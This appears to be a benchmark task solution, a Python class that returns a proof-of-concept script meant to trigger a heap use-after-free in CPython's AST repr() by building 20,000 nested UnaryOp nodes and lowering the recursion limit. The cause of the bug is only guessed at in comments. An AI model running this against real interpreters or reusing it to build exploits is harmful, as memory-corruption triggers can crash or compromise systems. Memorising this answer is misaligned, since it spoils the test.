import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
        
        The vulnerability is triggered by invoking repr() on a deeply nested AST structure.
        Parsing such a structure directly from source code would hit parser stack limits,
        so we construct the AST programmatically. The UAF likely occurs during error 
        handling (recursion limit) within the C-level repr implementation.
        """
        poc_code = """import ast
import sys

# Increase recursion limit to allow constructing a deep AST
sys.setrecursionlimit(100000)

def trigger():
    # Construct a deeply nested AST chain.
    # The depth needs to be sufficient to stress the recursive repr() implementation
    # or trigger stack/recursion limit checks where the UAF resides.
    # Ground truth size (~274KB) suggests significant depth.
    
    # Start with a leaf node
    node = ast.Constant(value=0)
    
    # Wrap in UnaryOp nodes (e.g. + + + ... 0)
    # This creates a deep linked list of AST nodes
    for _ in range(20000):
        node = ast.UnaryOp(op=ast.UAdd(), operand=node)
        
    # Reset recursion limit to standard to ensure we hit the recursion limit
    # during repr(), which is often where error-handling UAF bugs exist.
    sys.setrecursionlimit(1000)
    
    try:
        # This call triggers the AST repr traversal
        repr(node)
    except RecursionError:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    trigger()
"""
        return poc_code.encode('utf-8')
